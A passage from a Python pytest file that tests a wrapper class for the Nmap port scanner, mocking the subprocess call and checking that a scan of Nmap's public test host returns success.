        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("scanme.nmap.org")
            
            mock_result = Mock()
            mock_result.returncode = 0
            mock_result.stdout = SAMPLE_NMAP_XML
            mock_result.stderr = ""

            with patch.object(scanner, "_run_subprocess", return_value=mock_result):
                result = asyncio.run(scanner.scan(timeout=1))
                assert result.success is True


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
